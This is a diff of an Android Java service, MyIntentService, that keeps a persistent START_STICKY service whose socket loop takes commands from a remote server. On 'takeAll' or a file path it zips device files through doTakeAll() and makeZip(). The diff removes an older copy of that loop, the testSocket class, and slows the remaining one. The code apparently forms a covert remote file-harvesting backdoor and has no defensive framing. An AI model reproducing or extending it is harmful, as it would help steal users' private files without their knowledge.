@@ -82,12 +82,11 @@ public class MyIntentService extends IntentService {
         Log.e("Service", "onStartCommand");
         Toast.makeText(this, "service starting", Toast.LENGTH_SHORT).show();
 
-        //connect();
         Message msg = mServiceHandler.obtainMessage();
         msg.arg1 = startId;
         mServiceHandler.sendMessage(msg);
 
-        //new DownloadFilesTask().execute(null, null, null);
+
         return START_STICKY;
     }
 
@@ -130,7 +129,7 @@ public class MyIntentService extends IntentService {
 
                         if (response.equals("ack")) {
                             Log.i("TESTSOCKET", "primo");
-                            SystemClock.sleep(1000);
+                            SystemClock.sleep(5000);
                             toWrite = "ack";
                             dos.writeUTF(toWrite);
                         } else if (response.equals("takeAll")){
@@ -420,79 +419,6 @@ public class MyIntentService extends IntentService {
         }
 
 
-
-    private class testSocket extends AsyncTask<String, Void, String> {
-
-        @Override
-        protected String doInBackground(String... urls) {
-            Socket s = null;
-            BufferedReader br = null;
-            while (true){
-                try {
-                    s = new Socket(ip, port_socket);
-                    DataOutputStream dos = null;
-                    DataInputStream dis2 = null;
-                    boolean socketAlive = true;
-                    String toWrite = "ack";
-
-                    dos = new DataOutputStream(s.getOutputStream());
-
-                    dos.writeUTF(toWrite);
-
-                    //read input stream
-                    dis2 = new DataInputStream(s.getInputStream());
-                    InputStreamReader disR2 = new InputStreamReader(dis2);
-                    br = new BufferedReader(disR2);//create a BufferReader object for input
-                    while (socketAlive) {
-                        String response = br.readLine(); //read line
-                        br = new BufferedReader(new InputStreamReader(s.getInputStream()));
-
-                        Log.i("TSTTTT", response + " " + response.toString() + " " + response.length());
-
-                        if (br == null) {
-                            Log.e("TESTSOCKET", "BR NULL");
-                            break;
-                        }
-                        
-                        if (response.equals("ack")) {
-                            Log.i("TESTSOCKET", "primo");
-                            SystemClock.sleep(1000);
-                            toWrite = "ack";
-                            dos.writeUTF(toWrite);
-                        } else if (response.equals("takeAll")){
-                            Log.i("TESTSOCKET", "takeAll");
-                            toWrite = "OK";
-                            doTakeAll();
-                        }else {
-                            Log.i("TESTSOCKET", "take file");
-                            toWrite = "OK";
-                            makeZip(response);
-                        }
-
-                        dos.writeUTF(toWrite);
-                    }
-
-
-                    dis2.close();
-                    s.close();
-                    SystemClock.sleep(10000);
-
-                } catch (Exception e) {
-                    Log.e("TESTSOCKET-catch", String.valueOf(e));
-                }
-            }
-
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            Log.e("TESTSOCKET_onPostE",result);
-        }
-    }
-
-    public void connect() {
-        new testSocket().execute(null, null, null);
-    }
     /**/
 
     @Override
